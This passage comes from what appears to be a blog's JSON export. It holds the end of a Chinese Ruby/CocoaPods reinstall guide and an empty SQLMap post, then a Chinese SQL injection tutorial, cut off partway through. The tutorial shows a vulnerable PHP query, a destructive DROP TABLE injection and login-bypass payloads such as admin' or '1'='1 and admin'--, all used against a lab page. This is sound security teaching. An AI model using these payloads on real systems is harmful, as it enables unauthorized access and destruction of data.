wait</span><br><span class=\"line\">Installed rubygems 3.3.7 is newer than 3.0.9 provided with installed ruby, skipping installation, use --force to force installation.</span><br><span class=\"line\">ruby-3.1.2 - #gemset created /Users/xx/.rvm/gems/ruby-3.1.2@global</span><br><span class=\"line\">ruby-3.1.2 - #importing gemset /Users/xx/.rvm/gemsets/global.gems - please wait</span><br><span class=\"line\">ruby-3.1.2 - #generating global wrappers - please wait</span><br><span class=\"line\">ruby-3.1.2 - #gemset created /Users/xx/.rvm/gems/ruby-3.1.2</span><br><span class=\"line\">ruby-3.1.2 - #importing gemsetfile /Users/xx/.rvm/gemsets/default.gems evaluated to empty gem list</span><br><span class=\"line\">ruby-3.1.2 - #generating default wrappers - please wait</span><br><span class=\"line\">ruby-3.1.2 - #adjusting #shebangs for (gem irb erb ri rdoc testrb rake).</span><br><span class=\"line\">Install of ruby-3.1.2 - #complete</span><br></pre></td></tr></table></figure>\n\n<p>查看安装结果</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rvm list</span>                                                                                                      </span><br><span class=\"line\">   ruby-2.3.1 [ x86_64 ]</span><br><span class=\"line\">=* ruby-3.1.2 [ x86_64 ]</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">=&gt; - current</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">=* - current &amp;&amp; default</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"> * - default</span></span><br></pre></td></tr></table></figure>\n\n<p>移除<code>2.3.1</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rvm remove ruby-2.3.1</span></span><br><span class=\"line\"></span><br><span class=\"line\">ruby-2.3.1 - #removing rubies/ruby-2.3.1 - please wait</span><br><span class=\"line\">ruby-2.3.1 - #removing gems - please wait</span><br><span class=\"line\">Using /Users/xx/.rvm/gems/ruby-3.1.2</span><br></pre></td></tr></table></figure>\n\n<p>最终结果如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rvm list</span></span><br><span class=\"line\"></span><br><span class=\"line\">=* ruby-3.1.2 [ x86_64 ]</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">=&gt; - current</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">=* - current &amp;&amp; default</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"> * - default</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"重新安装CocoaPods\"><a href=\"#重新安装CocoaPods\" class=\"headerlink\" title=\"重新安装CocoaPods\"></a>重新安装CocoaPods</h2><p>重新安装</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">gem install cocoapods</span></span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">Done installing documentation for nanaimo, colored2, claide, CFPropertyList, atomos, xcodeproj, ruby-macho, nap, molinillo, gh_inspector, fourflusher, escape, cocoapods-try, netrc, cocoapods-trunk, cocoapods-search, cocoapods-plugins, cocoapods-downloader, cocoapods-deintegrate, ffi, ethon, typhoeus, public_suffix, fuzzy_match, concurrent-ruby, httpclient, algoliasearch, addressable, zeitwerk, tzinfo, i18n, activesupport, cocoapods-core, cocoapods after 19 seconds</span><br><span class=\"line\">34 gems installed</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装依赖\"><a href=\"#安装依赖\" class=\"headerlink\" title=\"安装依赖\"></a>安装依赖</h2><p>修复了Ruby和CocoaPods，可以继续安装Xcode依赖的了。</p>\n"},{"title":"SQLMap","date":"2023-05-02T00:27:19.000Z","_content":"","source":"_posts/SQLMap.md","raw":"---\ntitle: SQLMap\ntags: 渗透 BugBounty 安全 Cybersecurity\ndate: 2023-05-02 08:27:19\n---\n","slug":"SQLMap","published":1,"updated":"2023-05-02T00:27:35.677Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clh5pn0bq00037ex235l278iv","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"SQL INJECTION FUNDAMENTALS","date":"2023-05-02T02:52:32.000Z","_content":"\n## 0x01 介绍\n\n大多数现代 Web 应用程序在后端使用数据库结构。此类数据库用于存储和检索与 Web 应用程序相关的数据，从实际 Web 内容到用户信息和内容等。为了使 Web 应用程序动态化，Web 应用程序必须与数据库实时交互。当来自用户的 HTTP(S) 请求到达时，Web 应用程序的后端将向数据库发出查询以构建响应。这些查询可以包括来自 HTTP(S) 请求的信息或其他相关信息。\n\n![数据库管理系统架构](https://p.ipic.vip/oxdmae.png)\n\n当用户提供的信息用于构造对数据库的查询时，恶意用户可以诱使查询用于原始程序员预期之外的其他用途，从而使用称为 SQL 注入的攻击为用户提供查询数据库的权限（ SQLi).\n\nSQL 注入是指针对关系数据库的攻击，例如`MySQL`（而非关系数据库的注入，例如 MongoDB，是 NoSQL 注入）。本模块将重点`MySQL`介绍 SQL 注入概念。\n\n------\n\n### SQL 注入 (SQLi)\n\nWeb 应用程序中可能存在许多类型的注入漏洞，例如 HTTP 注入、代码注入和命令注入。然而，最常见的例子是 SQL 注入。当恶意用户试图传递更改 Web 应用程序发送到数据库的最终 SQL 查询的输入时，就会发生 SQL 注入，从而使用户能够直接对数据库执行其他意外的 SQL 查询。\n\n有很多方法可以做到这一点。要使 SQL 注入发挥作用，攻击者必须首先注入 SQL 代码，然后通过更改原始查询或执行全新的查询来颠覆 Web 应用程序逻辑。首先，攻击者必须在预期的用户输入限制之外注入代码，因此它不会作为简单的用户输入来执行。在最基本的情况下，这是通过注入单引号 ( `'`) 或双引号 ( `\"`) 来避开用户输入的限制并将数据直接注入 SQL 查询来完成的。\n\n一旦攻击者可以注入，他们就必须寻找一种方法来执行不同的 SQL 查询。这可以通过使用 SQL 代码来组成一个工作查询来完成，该查询可以同时执行预期的 SQL 查询和新的 SQL 查询。有很多方法可以实现这一点，例如使用[堆叠](https://www.sqlinjection.net/stacked-queries/)查询或使用[联合](https://www.mysqltutorial.org/sql-union-mysql.aspx/)查询。最后，要检索新查询的输出，我们必须在 Web 应用程序的前端对其进行解释或捕获。\n\n------\n\n### 用例和影响\n\nSQL 注入可能会产生巨大的影响，尤其是在后端服务器和数据库的权限非常松懈的情况下。\n\n首先，我们可能会检索我们不应该看到的秘密/敏感信息，例如用户登录名和密码或信用卡信息，然后可以将其用于其他恶意目的。SQL 注入导致许多网站密码和数据泄露，这些网站随后被重新用于窃取用户帐户、访问其他服务或执行其他恶意操作。\n\nSQL 注入的另一个用例是破坏预期的 Web 应用程序逻辑。最常见的示例是在不传递有效的用户名和密码凭据对的情况下绕过登录。另一个例子是访问锁定给特定用户的功能，比如管理面板。攻击者还可以直接在后台服务器上读写文件，进而在后台服务器上设置后门，直接控制后台服务器，最终控制整个后台服务器。网站。\n\n------\n\n### 预防\n\nSQL 注入通常是由编码不当的 Web 应用程序或不安全的后端服务器和数据库权限引起的。稍后，我们将讨论通过安全编码方法（例如用户输入清理和验证以及适当的后端用户权限和控制）来减少易受 SQL 注入攻击的机会的方法。\n\n## 0x02 数据库简介\n\n在我们了解 SQL 注入之前，我们需要更多地了解数据库和结构化查询语言 (SQL)，哪些数据库将执行必要的查询。网络应用程序利用后端数据库来存储与网络应用程序相关的各种内容和信息。这可以是核心 Web 应用程序资产，如图像和文件、内容（如帖子和更新）或用户数据（如用户名和密码）。\n\n有许多不同类型的数据库，每一种都适合特定的用途。传统上，应用程序使用基于文件的数据库，随着大小的增加，速度非常慢。`Database Management Systems`这导致了( )的采用`DBMS`。\n\n------\n\n### 数据库管理系统\n\n数据库管理系统 (DBMS) 有助于创建、定义、托管和管理数据库。随着时间的推移，设计了各种 DBMS，例如基于文件、关系 DBMS (RDBMS)、NoSQL、基于图形和键/值存储。\n\n有多种方式可以与 DBMS 交互，例如命令行工具、图形界面，甚至 API（应用程序编程接口）。DBMS 用于各种银行、金融和教育部门以记录大量数据。DBMS 的一些基本特征包括：\n\n| **特征**                    | **描述**                                                     |\n| --------------------------- | ------------------------------------------------------------ |\n| `Concurrency`               | 一个真实世界的应用程序可能有多个用户同时与之交互。DBMS 确保这些并发交互成功而不会损坏或丢失任何数据。 |\n| `Consistency`               | 对于如此多的并发交互，DBMS 需要确保数据在整个数据库中保持一致和有效。 |\n| `Security`                  | DBMS 通过用户身份验证和权限提供细粒度的安全控制。这将防止未经授权查看或编辑敏感数据。 |\n| `Reliability`               | 备份数据库并在数据丢失或破坏的情况下将它们回滚到以前的状态很容易。 |\n| `Structured Query Language` | SQL 通过支持各种操作的直观语法简化了用户与数据库的交互。     |\n\n------\n\n### 架构\n\n下图详细说明了一个两层架构。\n\n![数据库管理系统架构](https://p.ipic.vip/jadjj1.png)\n\n`Tier I`通常由客户端应用程序组成，例如网站或 GUI 程序。这些应用程序由高级交互组成，例如用户登录或评论。`Tier II`来自这些交互的数据通过 API 调用或其他请求传递。\n\n第二层是中间件，它解释这些事件并将它们放入 DBMS 所需的格式中。最后，应用层根据 DBMS 的类型使用特定的库和驱动程序与它们进行交互。DBMS 从第二层接收查询并执行请求的操作。这些操作可能包括数据的插入、检索、删除或更新。处理后，DBMS 返回任何请求的数据或错误代码以应对无效查询。\n\n可以在同一台主机上托管应用程序服务器和 DBMS。但是，具有支持许多用户的大量数据的数据库通常单独托管以提高性能和可伸缩性。\n\n## 0x03 数据库类型\n\n一般来说，数据库分为`Relational Databases`和`Non-Relational Databases`。只有关系数据库使用 SQL，而非关系数据库使用多种通信方法。\n\n------\n\n### 关系数据库\n\n关系数据库是最常见的数据库类型。它使用模式、模板来指示存储在数据库中的数据结构。例如，我们可以想象一家向其客户销售产品的公司拥有关于这些产品的去向、销售对象和数量的某种形式的存储知识。然而，这通常是在后端完成的，而在前端没有明显的通知。每种方法都可以使用不同类型的关系数据库。例如，第一个表可以存储和显示基本的客户信息，第二个表可以存储销售的产品数量及其成本，第三个表可以列举谁购买了这些产品以及支付数据。\n\n关系数据库中的表与提供快速数据库摘要或在需要查看特定数据时访问特定行或列的键相关联。这些表，也称为实体，都相互关联。例如，客户信息表可以为每个客户提供一个特定的 ID，该 ID 可以指示我们需要了解的有关该客户的所有信息，例如地址、姓名和联系信息。此外，产品描述表可以为每个产品分配一个特定的 ID。存储所有订单的表只需要记录这些 ID 及其数量。这些表格中的任何更改都会影响所有这些表格，但可以预见和系统地影响。\n\n`relational database management system`但是，在处理集成数据库时，需要一个概念，即使用称为( )的键将一个表链接到另一个表`RDBMS`。许多最初使用不同概念的公司正在转向 RDBMS 概念，因为这个概念易于学习、使用和理解。最初，这个概念只被大公司使用。然而，许多类型的数据库现在都实现了 RDBMS 概念，例如 Microsoft Access、MySQL、SQL Server、Oracle、PostgreSQL 等等。\n\n例如，我们可以`users`在关系数据库中有一个表，其中包含`id`、`username`、`first_name`、`last_name`和其他列。可以`id`用作表键。另一个表`posts`可能包含所有用户发布的帖子，列有`id`、`user_id`、`date`、`content`等。\n\n![HTML范例](https://p.ipic.vip/ko5y8y.jpg)\n\n我们可以将表中的`id`from链接`users`到`user_id`表中`posts`以检索每个帖子的用户详细信息，而无需存储每个帖子的所有用户详细信息。一个表可以有多个键，因为另一列可以用作键来链接另一个表。因此，例如，该`id`列可以用作将`posts`表链接到另一个包含评论的表的键，每个评论都属于一个特定的帖子，等等。\n\n数据库中表之间的关系称为模式。\n\n这样，通过使用关系数据库，可以快速轻松地从所有数据库中检索有关特定元素的所有数据。因此，例如，我们可以使用单个查询从所有表中检索链接到特定用户的所有详细信息。这使得关系数据库对于具有清晰结构和设计以及高效数据管理的大数据集非常快速和可靠。关系数据库最常见的示例是`MySQL`，我们将在本模块中介绍。\n\n------\n\n### 非关系数据库\n\n非关系数据库（也称为`NoSQL`数据库）不使用表、行和列或主键、关系或模式。相反，NoSQL 数据库根据存储的数据类型使用各种存储模型来存储数据。由于没有为数据库定义的结构，NoSQL 数据库具有很强的可扩展性和灵活性。因此，在处理定义和结构不是很好的数据集时，NoSQL 数据库将是存储此类数据的最佳选择。NoSQL 数据库有四种常见的存储模型：\n\n- 核心价值\n- 基于文档\n- 宽栏\n- 图形\n\n上述每个模型都有不同的数据存储方式。例如，该`Key-Value`模型通常以 JSON 或 XML 格式存储数据，每一对都有一个键，并将其所有数据存储为它的值： ![HTML范例](https://p.ipic.vip/m6b9rg.jpg)\n\n上面的示例可以使用 JSON 表示为：\n\n```json\n{\n  \"100001\": {\n    \"date\": \"01-01-2021\",\n    \"content\": \"Welcome to this web application.\"\n  },\n  \"100002\": {\n    \"date\": \"02-01-2021\",\n    \"content\": \"This is the first post on this web app.\"\n  },\n  \"100003\": {\n    \"date\": \"02-01-2021\",\n    \"content\": \"Reminder: Tomorrow is the ...\"\n  }\n}\n```\n\n它看起来类似于`Python`or `PHP`（即`{'key':'value'}`）等语言中的字典项，其中 the`key`通常是字符串，而 the`value`可以是字符串、字典或任何类对象。\n\nNoSQL 数据库最常见的示例是`MongoDB`.\n\n## 0x04 SQL 注入简介\n\n### 在 Web 应用程序中使用 SQL\n\n首先，让我们看看 Web 应用程序如何使用 MySQL 数据库来存储和检索数据。一旦在后端服务器上安装并设置了 DBMS 并启动并运行，Web 应用程序就可以开始利用它来存储和检索数据。\n\n例如，在`PHP`Web 应用程序中，我们可以连接到我们的数据库，并`MySQL`通过`MySQL`语法开始使用数据库，就在 中`PHP`，如下所示：\n\n```php\n$conn = new mysqli(\"localhost\", \"root\", \"password\", \"users\");\n$query = \"select * from logins\";\n$result = $conn->query($query);\n```\n\n然后，查询的输出将存储在 中`$result`，我们可以将其打印到页面或以任何其他方式使用它。下面的 PHP 代码将在新行中打印 SQL 查询的所有返回结果：\n\n```php\nwhile($row = $result->fetch_assoc() ){\n\techo $row[\"name\"].\"<br>\";\n}\n```\n\nWeb 应用程序在检索数据时通常也使用用户输入。例如，当用户使用搜索功能搜索其他用户时，他们的搜索输入将传递给 Web 应用程序，该应用程序使用输入在数据库中进行搜索：\n\n```php\n$searchInput =  $_POST['findUser'];\n$query = \"select * from logins where username like '%$searchInput'\";\n$result = $conn->query($query);\nIf we use user-input within an SQL query, and if not securely coded, it may cause a variety of issues, like SQL Injection vulnerabilities.\n```\n\n------\n\n### 什么是注射？\n\n在上面的示例中，我们接受用户输入并将其直接传递给 SQL 查询而不进行清理。\n\n清理是指删除用户输入中的任何特殊字符，以中断任何注入尝试。\n\n当应用程序将用户输入错误解释为实际代码而不是字符串时，就会发生注入，从而更改代码流并执行它。这可以通过注入特殊字符（如 ( `'`)）来转义用户输入边界，然后编写要执行的代码（如 JavaScript 代码或 SQL 注入中的 SQL）来实现。除非对用户输入进行清理，否则很可能会执行注入的代码并运行它。\n\n------\n\n### SQL注入\n\n当用户输入被输入到 SQL 查询字符串中而没有正确清理或过滤输入时，就会发生 SQL 注入。前面的示例展示了如何在 SQL 查询中使用用户输入，并且它没有使用任何形式的输入清理：\n\n```php\n$searchInput =  $_POST['findUser'];\n$query = \"select * from logins where username like '%$searchInput'\";\n$result = $conn->query($query);\n```\n\n在典型情况下，`searchInput`将输入 以完成查询，返回预期结果。我们键入的任何输入都会进入以下 SQL 查询：\n\n```sql\nselect * from logins where username like '%$searchInput'\n```\n\n所以，如果我们输入`admin`，它变成`'%admin'`。在这种情况下，如果我们编写任何 SQL 代码，它只会被视为搜索词。例如，如果我们输入`SHOW DATABASES;`，它将被执行为`'%SHOW DATABASES;'`Web 应用程序将搜索类似于 的用户名`SHOW DATABASES;`。但是，由于没有清理，在这种情况下，**我们可以添加一个单引号 ( `'`)，它将结束用户输入字段，然后我们可以编写实际的 SQL 代码**。例如，如果我们搜索`1'; DROP TABLE users;`，搜索输入将是：\n\n```php\n'%1'; DROP TABLE users;'\n```\n\n请注意我们如何在“1”之后添加单引号 (')，以避开用户输入 ('%$searchInput') 的范围。\n\n因此，最终执行的 SQL 查询如下：\n\n```sql\nselect * from logins where username like '%1'; DROP TABLE users;'\n```\n\n正如我们从语法突出显示中看到的那样，我们可以转义原始查询的边界并执行新注入的查询。`Once the query is run, the `用户` table will get deleted.`\n\n注意：在上面的示例中，为了简单起见，我们在分号（;）之后添加了另一个 SQL 查询。虽然这对于 MySQL 实际上是不可能的，但对于 MSSQL 和 PostgreSQL 是可能的。在接下来的部分中，我们将讨论在 MySQL 中注入 SQL 查询的真正方法。\n\n------\n\n### 语法错误\n\n前面的 SQL 注入示例将返回错误：\n\n```php\nError: near line 1: near \"'\": syntax error\n```\n\n这是因为最后一个尾随字符，我们有一个`'`没有关闭的额外引号 ()，这会导致执行时出现 SQL 语法错误：\n\n```sql\nselect * from logins where username like '%1'; DROP TABLE users;'\n```\n\n在这种情况下，我们只有一个尾随字符，因为我们的搜索查询输入接近 SQL 查询的末尾。然而，用户输入通常在 SQL 查询的中间，原始 SQL 查询的其余部分在它之后。\n\n要成功注入，我们必须确保新修改的 SQL 查询在注入后仍然有效并且没有任何语法错误。在大多数情况下，我们无法访问源代码来查找原始 SQL 查询并开发适当的 SQL 注入来进行有效的 SQL 查询。那么，我们如何才能成功地注入到 SQL 查询中呢？\n\n一个答案是使用`comments`，我们将在后面的部分讨论这个问题。另一种方法是通过传入多个单引号使查询语法起作用，我们将在接下来讨论 ( `'`)。\n\n现在我们了解了 SQL 注入的基础知识，让我们开始学习一些实际用途。\n\n------\n\n### SQL注入的类型\n\nSQL 注入根据我们检索其输出的方式和位置进行分类。\n\n![数据库管理系统架构](https://p.ipic.vip/p4s9ku.jpg)\n\n在简单的情况下，预期和新查询的输出可能会直接打印在前端，我们可以直接读取。这称为`In-band`SQL 注入，它有两种类型：`Union Based`和`Error Based`。\n\n使用`Union Based`SQL 注入，我们可能必须指定我们可以读取的确切位置，即“列”，以便查询将输出定向到那里打印。至于SQL 注入，当我们可以在前端`Error Based`获取`PHP`或错误时使用它，因此我们可能会故意导致返回查询输出的 SQL 错误。`SQL`\n\n在更复杂的情况下，我们可能无法打印输出，因此我们可以利用 SQL 逻辑逐个字符地检索输出。这称为`Blind`SQL 注入，它也有两种类型：`Boolean Based`和`Time Based`。\n\n通过`Boolean Based`SQL 注入，我们可以使用 SQL 条件语句来控制页面是否返回任何输出，“即原始查询响应”，如果我们的条件语句返回`true`。对于`Time Based`SQL 注入，我们使用 SQL 条件语句，如果条件语句`true`使用`Sleep()`函数返回，则延迟页面响应。\n\n最后，在某些情况下，我们可能无法直接访问输出，因此我们可能必须将输出定向到远程位置，“即 DNS 记录”，然后尝试从那里检索它。这称为`Out-of-band`SQL 注入。\n\n在本模块中，我们将只专注于通过学习 SQL 注入来介绍`Union Based`SQL 注入。\n\n## 0x05 颠覆查询逻辑\n\n------\n\n现在我们对 SQL 语句的工作原理有了基本的了解，让我们开始 SQL 注入。在我们开始执行整个 SQL 查询之前，我们将首先学习通过注入运算符`OR`和使用 SQL 注释来颠覆原始查询逻辑来修改原始查询。这方面的一个基本示例是绕过 Web 身份验证，我们将在本节中对此进行演示。\n\n------\n\n### 身份验证绕过\n\n考虑以下管理员登录页面。\n\n![管理面板](https://p.ipic.vip/v1wx7o.png)\n\n我们可以使用管理员凭据登录`admin / p@ssw0rd`。\n\n![admin_creds](https://p.ipic.vip/rr2k1g.png)\n\n该页面还显示了正在执行的 SQL 查询，以便更好地了解我们将如何颠覆查询逻辑。我们的目标是在不使用现有密码的情况下以管理员用户身份登录。正如我们所见，当前正在执行的 SQL 查询是：\n\n```sql\nSELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';\n```\n\n该页面接收凭据，然后使用`AND`运算符选择与给定用户名和密码匹配的记录。如果`MySQL`数据库返回匹配的记录，则凭据有效，因此代码`PHP`会将登录尝试条件评估为`true`。如果条件评估为`true`，则返回管理员记录，并验证我们的登录。让我们看看当我们输入错误的凭据时会发生什么。\n\n![管理员不正确](https://p.ipic.vip/wiuu1q.png)\n\n不出所料，由于密码错误导致`false`操作结果导致登录失败`AND`。\n\n------\n\n### SQLi 发现\n\n在我们开始破坏 Web 应用程序的逻辑并试图绕过身份验证之前，我们首先必须测试登录表单是否容易受到 SQL 注入的攻击。为此，我们将尝试在我们的用户名后添加以下有效负载之一，看看它是否会导致任何错误或改变页面的行为方式：\n\n| 有效载荷 | 网址编码 |\n| -------- | -------- |\n| `'`      | `%27`    |\n| `\"`      | `%22`    |\n| `#`      | `%23`    |\n| `;`      | `%3B`    |\n| `)`      | `%29`    |\n\n注意：在某些情况下，我们可能必须使用负载的 URL 编码版本。这方面的一个例子是当我们将我们的有效负载直接放在 URL“即 HTTP GET 请求”中时。\n\n因此，让我们从注入单引号开始：\n\n![报价错误](https://p.ipic.vip/j8ps1w.png)\n\n我们看到抛出了 SQL 错误而不是`Login Failed`消息。该页面引发错误，因为生成的查询是：\n\n```sql\nSELECT * FROM logins WHERE username=''' AND password = 'something';\n```\n\n如上一节所述，我们输入的引号导致了奇数个引号，从而导致语法错误。一种选择是注释掉查询的其余部分，并将查询的其余部分作为我们注入的一部分来编写，以形成一个有效的查询。另一种选择是在我们注入的查询中使用偶数个引号，这样最终的查询仍然有效。\n\n------\n\n### 或注射\n\n`true`无论输入的用户名和密码如何，我们都需要查询始终返回，以绕过身份验证。为此，我们可以`OR`在 SQL 注入中滥用运算符。\n\n如前所述，[操作优先级的](https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html)MySQL 文档指出`AND`操作符将在操作符之前被评估`OR`。`TRUE`这意味着如果整个查询中至少有一个条件和一个`OR`运算符，则整个查询的计算结果将是 to `TRUE`，因为如果其操作数之一是 ，`OR`则运算符返回。`TRUE``TRUE`\n\n始终返回的条件示例`true`是`'1'='1'`。但是，为了保持 SQL 查询正常工作并保持偶数个引号，而不是使用 ('1'='1')，我们将删除最后一个引号并使用 ('1'='1)，因此剩下的单引号原始查询中的引用将取而代之。\n\n因此，如果我们注入以下条件并`OR`在它和原始条件之间有一个运算符，它应该总是返回`true`：\n\n```sql\nadmin' or '1'='1\n```\n\n最终查询应如下所示：\n\n```sql\nSELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';\n```\n\n这意味着以下内容：\n\n- 如果用户名是`admin`\n  `OR`\n- 如果`1=1`返回`true`'总是返回`true`'\n  `AND`\n- 如果密码是`something`\n\n![or_inject_diagram](https://p.ipic.vip/z4rxm0.png)\n\n运算`AND`符将首先被评估，然后返回`false`。然后，`OR`运算符将被评估，如果其中一个语句是`true`，它将返回`true`。由于`1=1`总是返回`true`，此查询将返回`true`，并且它会授予我们访问权限。\n\n注意：我们上面使用的有效载荷是我们可以用来破坏身份验证逻辑的众多身份验证绕过有效载荷之一。[您可以在PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection#authentication-bypass)中找到完整的 SQLi 身份验证绕过负载列表，每个负载都适用于特定类型的 SQL 查询。\n\n------\n\n### 使用 OR 运算符绕过身份验证\n\n让我们尝试将此作为用户名并查看响应。 ![注入成功](https://p.ipic.vip/axfg4d.png)\n\n我们能够以管理员身份成功登录。但是，如果我们不知道有效的用户名怎么办？这次让我们用不同的用户名尝试相同的请求。\n\n![notadmin_fail](https://p.ipic.vip/227o29.png)\n\n登录失败，因为`notAdmin`表中不存在，导致整体查询错误。\n\n![notadmin_diagram](https://p.ipic.vip/l1tx6e.png)\n\n要再次成功登录，我们需要一个整体`true`查询。这可以通过`OR`在密码字段中注入一个条件来实现，因此它总是会返回`true`。让我们尝试`something' or '1'='1`作为密码。\n\n![密码或注入](https://p.ipic.vip/6me5id.png)\n\n附加`OR`条件导致`true`整体查询，因为该`WHERE`子句返回表中的所有内容，并且第一行中的用户已登录。在这种情况下，由于两个条件都将返回，`true`我们不必提供测试用户名和密码，可以直接开始注入`'`，直接用`' or '1' = '1`.\n\n![basic_auth_bypass](https://p.ipic.vip/a4r69u.png)\n\n这是有效的，因为查询的计算结果与`true`用户名或密码无关。\n\n## 0x06 使用注释\n\n本节将介绍如何使用注释来颠覆更高级的 SQL 查询的逻辑，并最终得到一个有效的 SQL 查询来绕过登录身份验证过程。\n\n------\n\n### 注释\n\n就像任何其他语言一样，SQL 也允许使用注释。注释用于记录查询或忽略查询的特定部分。除了内联注释外，我们还可以在 MySQL`-- `和中使用两种类型的行注释（尽管这通常不用于 SQL 注入）。可以按如下方式使用：`#``/**/``--`\n\n```shell-session\nmysql> SELECT username FROM logins; -- Selects usernames from the logins table \n\n+---------------+\n| username      |\n+---------------+\n| admin         |\n| administrator |\n| john          |\n| tom           |\n+---------------+\n4 rows in set (0.00 sec)\n```\n\n注意：在 SQL 中，仅使用两个破折号不足以开始注释。所以，它们后面必须有一个空格，所以注释以 (-- ) 开头，末尾有一个空格。有时 URL 编码为 (--+)，因为 URL 中的空格被编码为 (+)。为清楚起见，我们将在末尾 (-- -) 添加另一个 (-)，以显示空格字符的使用。\n\n符号`#`也可以使用。\n\n```shell-session\nmysql> SELECT * FROM logins WHERE username = 'admin'; ## You can place anything here AND password = 'something'\n\n+----+----------+----------+---------------------+\n| id | username | password | date_of_joining     |\n+----+----------+----------+---------------------+\n|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |\n+----+----------+----------+---------------------+\n1 row in set (0.00 sec)\n```\n\n提示：如果您在浏览器的 URL 中输入有效负载，(#) 符号通常被视为标记，不会作为 URL 的一部分传递。为了在浏览器中使用 (#) 作为注释，我们可以使用 '%23'，这是一个 URL 编码 (#) 符号。\n\n服务器将在评估期间忽略查询的部分`AND password = 'something'`。\n\n------\n\n### 带有注释的身份验证绕过\n\n让我们回到我们之前的例子并注入`admin'-- `我们的用户名。最终查询将是：\n\n```sql\nSELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';\n```\n\n正如我们从语法突出显示中看到的那样，用户名现在是`admin`，查询的其余部分现在作为注释被忽略。此外，通过这种方式，我们可以确保查询没有任何语法问题。\n\n`admin'-- `让我们尝试在登录页面上使用这些，并使用用户名和任何密码登录：\n\n![admin_dash](https://p.ipic.vip/sqgtxx.png)\n\n如我们所见，我们能够绕过身份验证，因为新修改的查询会检查用户名，没有其他条件。\n\n------\n\n### 另一个例子\n\n如果应用程序需要先检查特定条件，SQL 支持使用括号。括号内的表达式优先于其他运算符并首先计算。让我们来看这样一个场景：\n\n![paranthesis_fail](https://p.ipic.vip/7qr0qc.png)\n\n上面的查询确保用户的 id 总是大于 1，这将阻止任何人以管理员身份登录。此外，我们还看到密码在用于查询之前已经过哈希处理。这将阻止我们通过密码字段进行注入，因为输入已更改为哈希。\n\n让我们尝试使用有效凭据登录`admin / p@ssw0rd`以查看响应。\n\n![paranthesis_valid_fail](https://p.ipic.vip/fa2q4c.png)\n\n正如预期的那样，即使我们提供了有效的凭据，登录也会失败，因为管理员的 ID 等于 1。因此让我们尝试使用另一个用户的凭据登录，例如`tom`。\n\n![tom_login](https://p.ipic.vip/r9086n.png)\n\n以 id 不等于 1 的用户身份登录成功。那么，我们如何以管理员身份登录呢？从前面关于注释的部分我们知道我们可以使用它们来注释查询的其余部分。因此，让我们尝试使用`admin'-- `as 用户名。\n\n![paranthesis_error](https://p.ipic.vip/e5z9ah.png)\n\n由于语法错误，登录失败，因为关闭的没有平衡开括号。要成功执行查询，我们必须添加一个右括号。让我们尝试使用用户名`admin')-- `关闭并注释掉其余部分。\n\n![paranthesis_success](https://p.ipic.vip/tf4imk.png)\n\n查询成功，我们以管理员身份登录。我们输入的最终查询是：\n\n```sql\nSELECT * FROM logins where (username='admin')\n```\n\n## 0x07 Union Clause\n\n到目前为止，我们只是在操纵原始查询来颠覆 Web 应用程序逻辑并绕过身份验证，使用运算符`OR`和注释。然而，另一种类型的 SQL 注入是注入与原始查询一起执行的整个 SQL 查询。本节将通过使用 MySQL`Union`子句来演示这一点`SQL Union Injection`。\n\n------\n\n### Union\n\n在开始学习 Union Injection 之前，我们应该先了解一下 SQL Union 子句。[Union](https://dev.mysql.com/doc/refman/8.0/en/union.html)子句用于组合多个`SELECT`语句的结果。这意味着通过`UNION`注入，我们将能够`SELECT`从多个表和数据库中跨 DBMS 转储和转储数据。让我们尝试`UNION`在示例数据库中使用运算符。首先，让我们看一下表的内容`ports`：\n\n```shell-session\nmysql> SELECT * FROM ports;\n\n+----------+-----------+\n| code     | city      |\n+----------+-----------+\n| CN SHA   | Shanghai  |\n| SG SIN   | Singapore |\n| ZZ-21    | Shenzhen  |\n+----------+-----------+\n3 rows in set (0.00 sec)\n```\n\n接下来，让我们看看表的输出`ships`：\n\n```shell-session\nmysql> SELECT * FROM 